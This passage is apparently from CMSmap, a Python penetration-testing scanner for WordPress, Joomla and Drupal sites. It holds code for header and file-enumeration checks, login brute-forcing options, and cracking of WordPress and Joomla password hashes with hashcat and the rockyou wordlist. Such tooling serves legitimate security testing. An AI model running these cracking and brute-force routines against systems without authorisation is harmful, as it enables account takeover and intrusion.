            self.ExtractFile('rockyou.zip', 'wordlist')
        for hashpsw in [line.strip() for line in open(hashfile)]:
            if len(hashpsw) == 34 : self.WPCrackHashes(); break
            elif len(hashpsw) == 65 : self.JooCrackHashes(); break
            else: print "[!] No Valid Password Hash: "+hashpsw
        
    def WPCrackHashes(self):     
        # hashcat -m 400 -a 0 -o cracked.txt hashes.txt passw.txt
        print "[-] Cracking WordPress Hashes in: "+self.hashfile+" ... "
        process = os.system("hashcat -m 400 -a 0 -o cracked.txt "+self.hashfile+" "+self.wordlist)
        if process == 0 :
            print "[-] Cracked Passwords saved in: cracked.txt"
        else :
            print "[!] Cracking could not be completed. Please install hashcat: http://hashcat.net/"

    def JooCrackHashes(self):
        # hashcat -m 10 -a 0 -o cracked.txt hashes.txt passw.txt
        print "[-] Cracking Joomla Hashes in: "+self.hashfile+" ... "
        process = os.system("hashcat -m 10 -a 0 -o cracked.txt "+self.hashfile+" "+self.wordlist)
        if process == 0 :
            print "[-] Cracked Passwords saved in: cracked.txt"
        else :
            print "[!] Cracking could not be completed. Please install hashcat: http://hashcat.net/"
            
    def ExtractFile(self, path, to_directory='.'):
        if path.endswith('.zip'):
            opener, mode = zipfile.ZipFile, 'r'
        elif path.endswith('.tar.gz') or path.endswith('.tgz'):
            opener, mode = tarfile.open, 'r:gz'
        elif path.endswith('.tar.bz2') or path.endswith('.tbz'):
            opener, mode = tarfile.open, 'r:bz2'
        else: 
            raise ValueError, "Could not extract `%s` as no appropriate extractor is found" % path
        cwd = os.getcwd()
        os.chdir(to_directory)
        try:
            file = opener(path, mode)
            try: file.extractall()
            finally: file.close()
        finally:
            os.chdir(cwd)
    
class GenericChecks:
    def __init__(self,url):
        self.url = url
        self.agent = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7'
        self.headers={'User-Agent':self.agent,}
        self.widgets = ['                              ', progressbar.Percentage(), ' ', progressbar.Bar(marker=progressbar.RotatingMarker()),' ', progressbar.ETA(), ' ', progressbar.FileTransferSpeed()]
        self.notExistingCode = 404
        self.queue_num = 5
        self.thread_num = 5
        self.commExt=['.txt', '.php', '/', '.html' ]
        self.notValidLen = []
        self.commFiles = [line.strip() for line in open(os.path.join(dataPath, 'common_files.txt'))]
        
    def DirectoryListing(self,relPath):
        self.relPath = relPath
        try:
            req = urllib2.Request(self.url+self.relPath,None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            dirList = re.search("<title>Index of", htmltext,re.IGNORECASE)
            if dirList: 
                msg = self.url+self.relPath ; report.low(msg)
        except urllib2.HTTPError, e:
            pass
        
    def HTTPSCheck(self):
        pUrl = urlparse.urlparse(self.url)
        #clean up supplied URLs
        scheme = pUrl.scheme.lower()
        if scheme == 'http' : 
            msg = "Website Not in HTTPS: "+self.url
            report.medium(msg)

    def HeadersCheck(self):
        req = urllib2.Request(self.url,None,self.headers)
        msg = "Checking Headers ..."; report.verbose(msg)
        try:
            response = urllib2.urlopen(req)
            #print response.info()
            if response.info().getheader('Server'):
                msg = "Server: "+response.info().getheader('Server'); report.info(msg)
            if response.info().getheader('X-Powered-By'):
                msg = "X-Powered-By: "+response.info().getheader('X-Powered-By'); report.info(msg)
            if response.info().getheader('X-Generator'):
                msg = "X-Generator: "+response.info().getheader('X-Generator'); report.low(msg)
            if response.info().getheader('x-xss-protection') == '0':
                msg = "X-XSS-Protection Disabled"; report.high(msg)
            if not response.info().getheader('x-frame-options') or (response.info().getheader('x-frame-options').lower() != 'sameorigin' or 'deny'):
                msg = "X-Frame-Options: Not Enforced"; report.low(msg)
            if not response.info().getheader('strict-transport-security'):
                msg = "Strict-Transport-Security: Not Enforced"; report.info(msg)
            if not response.info().getheader('x-content-security-policy'):
                msg = "X-Content-Security-Policy: Not Enforced"; report.info(msg)
        except urllib2.HTTPError, e:
            #print e.code
            pass

    def AutocompleteOff(self,relPath):
        self.relPath = relPath
        try:
            req = urllib2.Request(self.url+self.relPath,None,self.headers)
            htmltext = urllib2.urlopen(req).read()
            autoComp = re.search("autocomplete=\"off\"", htmltext,re.IGNORECASE)
            if not autoComp : 
                msg = "Autocomplete Off Not Found: "+self.url+self.relPath
                report.low(msg)
        except urllib2.HTTPError, e:
            pass
        
    def RobotsTXT(self):
        req = urllib2.Request(self.url+"/robots.txt",None,self.headers)
        try:
            urllib2.urlopen(req)
            msg = "Robots.txt Found: " +self.url+"/robots.txt"
            report.low(msg)
        except urllib2.HTTPError, e:
            #print e.code
            pass
    
    def NotExisitingLength(self):
        for exten in self.commExt:
            req = urllib2.Request(self.url+"/N0WayThatYouAreHere123"+exten,None, self.headers)
            noRedirOpener = urllib2.build_opener(NoRedirects())
            try:
                htmltext = noRedirOpener.open(req).read()
                self.notValidLen.append(len(htmltext))
            except urllib2.HTTPError, e:
                self.notValidLen.append(len(e.read()))
                self.notExistingCode = e.code
        self.notValidLen = sorted(set(self.notValidLen))
   
    def CommonFiles(self):
        msg = "Interesting Directories/Files ... "
        report.message(msg)
        self.pbar = progressbar.ProgressBar(widgets=self.widgets, maxval=(len(self.commFiles)*len(self.commExt))).start()
        self.interFiles = []
        # Create Code
        q = Queue.Queue(self.queue_num)        
        # Spawn all threads into code
        for u in range(self.thread_num):
            t = ThreadScanner(self.url,"/","",self.interFiles,self.notExistingCode,self.notValidLen,q)
            t.daemon = True
            t.start()
            
        for extIndex,ext in enumerate(self.commExt): 
        # Add all plugins to the queue
            for commFilesIndex,file in enumerate(self.commFiles):
                q.put(file+ext)
                sys.stdout.write(file+ext+"               \r")
                sys.stdout.flush()
                self.pbar.update((len(self.commFiles)*extIndex)+commFilesIndex)
                sys.stdout.flush() 
            q.join()
        self.pbar.finish()  

        for file in self.interFiles:
            msg = self.url+"/"+file; report.low(msg)
        self.pbar.finish()
        
class Report:
    def __init__(self):
        self.fn = ""
        self.log = ' '.join(sys.argv)
        self.col() 
        
    
    def col(self):
        if sys.stdout.isatty() and platform.system() != "Windows":
            self.green = '\033[32m'
            self.blue = '\033[94m'
            self.red = '\033[31m'
            self.brown = '\033[33m'
            self.grey = '\033[90m'
            self.orange = '\033[38;5;208m'
            self.yellow = '\033[93m'
            self.end = '\033[0m'
            
        else:# Disalbing col for windows and pipes
            self.green = ""
            self.orange = ""
            self.blue = ""
            self.red = ""
            self.brown = ""
            self.grey = ""
            self.yellow = ""
            self.end = ""
            
    def info(self,msg):
        self.WriteTextFile("[I] " +msg)
        msg = self.green + "[I] " + self.end + msg; print msg

    def low(self,msg):
        self.WriteTextFile("[L] " +msg)
        msg = self.yellow + "[L] " + self.end + msg; print msg

    def medium(self,msg):
        self.WriteTextFile("[M] " +msg)
        msg = self.orange + "[M] " + self.end + msg; print msg
        
    def high(self,msg):
        self.WriteTextFile("[H] " +msg)
        msg = self.red + "[H] " + self.end + msg; print msg

    def status(self,msg):
        self.WriteTextFile("[-] " +msg)
        msg = self.blue + "[-] " + self.end + msg; print msg
        
    def message(self,msg):
        msg = "[-] " + msg; print msg
        self.WriteTextFile(msg)
        
    def error(self,msg):
        self.WriteTextFile("[ERROR] " +msg)
        msg = self.red + "[ERROR] " + self.end + msg; print msg

    def verbose(self,msg):
        if verbose:
            self.WriteTextFile("[v] " +msg)
            msg = self.grey + "[v] " + self.end + msg; print msg
        
    def WriteTextFile(self,msg):
        if output:
            self.log += "\n"+msg
            f = open(self.fn,"w")
            f.write(self.log)
            f.close()
    
    def WriteHTMLFile(self):
        pass

    
    

# Global Variables =============================================================================================
version=0.4
verbose = False
CMSmapUpdate = False
BruteForcingAttack = False
CrackingPasswords = False
FullScan = False
dataPath = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'data')
output = False
threads = 5
wordlist = 'wordlist/rockyou.txt'

# Global Methos =================================================================================================

def exit(signum, frame):
    signal.signal(signal.SIGINT, original_sigint)
    try:
        msg = "Interrupt caught. Scan paused. Do you really want to exit?"; report.error(msg)
        if raw_input("[y/N]: ").lower().startswith('y'):
            msg = "Bye! Quitting.. "; report.message(msg)
            sys.exit()
    except KeyboardInterrupt:
        msg = "Bye! Quitting.."; report.message(msg)
        sys.exit()
    signal.signal(signal.SIGINT, exit)

def usage(version):
    print "CMSmap tool v"+str(version)+" - Simple CMS Scanner\nAuthor: Mike Manzotti mike.manzotti@dionach.com\nUsage: " + os.path.basename(sys.argv[0]) + """ -t <URL>
          -t, --target    target URL (e.g. 'https://abc.test.com:8080/')
          -v, --verbose   verbose mode (Default: false)
          -T, --threads   number of threads (Default: 5)
          -u, --usr       username or file 
          -p, --psw       password or file
          -i, --input     scan multiple targets listed in a given text file
          -o, --output    save output in a file
          -k, --crack     password hashes file (WordPress and Joomla only)
          -w, --wordlist  wordlist file (Default: rockyou.txt)
          -U, --update    (C)MSmap, (W)ordpress plugins and themes, (J)oomla components, (D)rupal modules
          -h, --help      show this help
          -f, --force     force scan (W)ordpress, (J)oomla or (D)rupal
          -F, --fullscan  full scan using large plugin lists. Slow! (Default: false)       
          """
    print "Example: "+ os.path.basename(sys.argv[0]) +" -t https://example.com"
    print "         "+ os.path.basename(sys.argv[0]) +" -t https://example.com -f W -F"
    print "         "+ os.path.basename(sys.argv[0]) +" -t https://example.com -i targets.txt -o output.txt"
    print "         "+ os.path.basename(sys.argv[0]) +" -t https://example.com -u admin -p passwords.txt"
    print "         "+ os.path.basename(sys.argv[0]) +" -k hashes.txt"
    
if __name__ == "__main__":
    # command line arguments
    
    scanner = Scanner()
    report = Report()
    initializer = Initialize()
    
    if sys.argv[1:]:
        try:
            optlist, args = getopt.getopt(sys.argv[1:], 't:u:p:T:o:k:w:vhU:f:i:F', ["target=", "verbose","help","usr=","psw=","output=","threads=","crack=","wordlist=","force=","update=","input=","fullscan"])
        except getopt.GetoptError as err:
            # print help information and exit:
            print(err) # print something like "option -a not recognized"
            usage(version)
            sys.exit(2)  
        for o, a in optlist:
            if o == "-h":
                usage(version)
                sys.exit()
            elif o in ("-t", "--target"):
                scanner.url = a
                scanner.CheckURL()
            elif o in ("-u", "--usr"):
                usrlist = a
                BruteForcingAttack = True
            elif o in ("-p", "--psw"):
                pswlist = a
            elif o in ("-k", "--crack"):
                CrackingPasswords = True
                hashfile = a
            elif o in ("-f", "--force"):
                scanner.force = a                
            elif o in ("-w", "--wordlist"):
                wordlist = a
            elif o in ("-T", "--threads"):
                threads = int(a)
                msg = "Threads Set : "+str(threads); report.info(msg)
            elif o in("-o", "--output"):
                output = True
                report.fn = a
            elif o in("-i", "--input"):
                scanner.file = a
            elif o in("-U", "--update"):
                CMSmapUpdate = True
                initializer.forceUpdate = a
            elif o in("-F", "--fullscan"):
                FullScan = True
            elif o in("-v", "--verbose"):
                verbose = True
            else:
                usage(version)
                sys.exit()
    else:
        usage(version)
        sys.exit()
    
    start = time.time()
    msg = "Date & Time: "+ time.strftime('%d/%m/%Y %H:%M:%S')
    report.status(msg)
    
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit)
    
    
    # if plugins don't exist (first time of running) then initialize
    wp_plugins = os.path.join(dataPath, 'wp_plugins_small.txt')
    wp_themes = os.path.join(dataPath, 'wp_themes_small.txt')
    joo_plugins = os.path.join(dataPath, 'joo_plugins_small.txt')
    dru_plugins = os.path.join(dataPath, 'dru_plugins_small.txt')
    
    if not os.path.isfile(wp_plugins or wp_themes or joo_plugins or dru_plugins):
        #initializer.GetWordPressPlugins()
        initializer.GetJoomlaPluginsExploitDB()
        initializer.GetWordpressPluginsExploitDB()
        initializer.GetWordpressThemesExploitDB()
        #initializer.GetDrupalPlugins()
        sys.exit()

    if CMSmapUpdate :      
        initializer.UpdateRun()
    elif BruteForcingAttack :
        BruteForcer(url,usrlist,pswlist).FindCMSType()
    elif CrackingPasswords:
        PostExploit(None).CrackingHashesType(hashfile, wordlist)
    
    elif scanner.file is not None:
        targets = [line.strip() for line in open(scanner.file)]
        for url in targets:
            scanner.url = url
            msg = "Target: "+scanner.url; report.status(msg)
            scanner.threads = threads
            scanner.FindCMSType()
    
    elif scanner.force is not None:
        msg = "Target: "+scanner.url; report.status(msg)
        scanner.threads = threads
        scanner.ForceCMSType()
    else :
        msg = "Target: "+scanner.url; report.status(msg)
        scanner.threads = threads
        scanner.FindCMSType()

    end = time.time()
    diffTime = end - start
    msg = "Date & Time: "+time.strftime('%d/%m/%Y %H:%M:%S')
    report.status(msg)
    msg = "Completed in: "+str(datetime.timedelta(seconds=diffTime)).split(".")[0]
    report.status(msg)
    if output: msg = "Output File Saved in: "+report.fn; report.status(msg) 
    
    
